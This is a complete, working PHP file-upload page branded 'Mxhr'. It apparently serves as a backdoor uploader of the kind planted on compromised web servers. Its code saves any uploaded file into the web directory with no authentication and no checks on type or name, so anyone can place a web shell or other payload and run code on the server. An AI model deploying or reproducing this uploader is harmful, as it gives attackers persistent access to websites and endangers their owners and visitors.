<html>
<title>.::Uploader::. | Mxhr</title>
<style type="text/css">
table {border-collapse: collapse;}
td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}
</style>
<body>
<center>
<font color= #e61e1e>
<img src="http://i.imgur.com/w88M6hl.png" />
<br>----------------------------------------------------------------</font>
<br>
<br>
<br>
<form method="post"  enctype="multipart/form-data">
<table width="350" border="0" cellpadding="1" cellspacing="1" class="box">
<tr> 
<td width="246">
<input type="hidden" name="MAX_FILE_SIZE" value="200000000000000">
<input name="userfile" type="file" id="userfile"> 
</td>
<td width="80"><input name="upload" type="submit" class="box" id="upload" value=" Upload "></td>
</tr>
</table>
</form>

<?php
$uploaddir = "";
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if (isset($_FILES['userfile']['name'])) {
        if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
                echo "<font color= #00FF00><center>The file ". basename($_FILES['userfile']['name']) ." has been uploaded</center></font>";
        } else {
                echo "<font color= #e61e1e><center>There was an error uploading the file. please try again!</center></font>";
        }}?>

<br/><font color= #e61e1e>----------------------------------------------------------------</font>
<br>
<br>
<div style="font-size:15px;color:red;font-style:Comic Sans Serif;">-= CopyRight � 2020 | Mxhr =-</div>
</body>
</html>
